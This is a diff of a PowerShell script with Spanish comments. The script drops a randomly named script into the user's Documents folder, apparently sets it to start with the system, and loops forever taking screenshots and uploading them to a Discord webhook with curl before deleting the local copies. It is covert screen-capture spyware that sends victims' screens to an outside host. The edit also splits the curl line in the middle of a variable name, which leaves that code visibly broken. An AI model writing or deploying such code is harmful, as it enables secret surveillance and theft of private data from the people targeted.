@@ -5,7 +5,7 @@ $seconds = 30
 
 # shortened URL Detection
 if ($hookurl.Ln -ne 121){
-    Write-Host "Shortened Webhook URL Detected...." 
+    Write-Host "Shortened Webhook URL Detected.." 
     $hookurl = (irm $hookurl).url
 }
 
@@ -58,7 +58,7 @@ $randomFileName = [System.IO.Path]::GetRandomFileName() + ".ps1"
 $scriptPath = Join-Path -Path $documentsFolder -ChildPath $randomFileName
 
 # Guardar el script en la carpeta de documentos
-Set-Content -Path $scriptPath -Value @"
+$scriptContent = @"
 # Definir la URL del webhook de Discord
 `$hookurl = "$dc"`
 # Definir el intervalo de tiempo entre capturas de pantalla en segundos
@@ -99,7 +99,8 @@ While (`$true){
     `$bitmap.Save(`$file2, [System.Drawing.Imaging.ImageFormat]::png)
     
     # Enviar ambas capturas de pantalla al webhook de Discord
-    curl.exe -F "file1=@`$file1" -F "file2=@`$file2" `$hookurl
+    curl.exe -F "file1=@`$file1" -F "file2=@`$file
+" $hookurl
     
     # Eliminar las capturas de pantalla después de enviarlas
     Remove-Item -Path `$file1
@@ -109,6 +110,9 @@ While (`$true){
     Start-Sleep -Seconds `$seconds
 }
 "@
+
+# Guardar el script en la carpeta de documentos
+Set-Content -Path $scriptPath -Value $scriptContent
 
 # Obtener la carpeta de inicio del usuario actual
 $startupFolder = [Environment]::GetFolderPath("Startup")
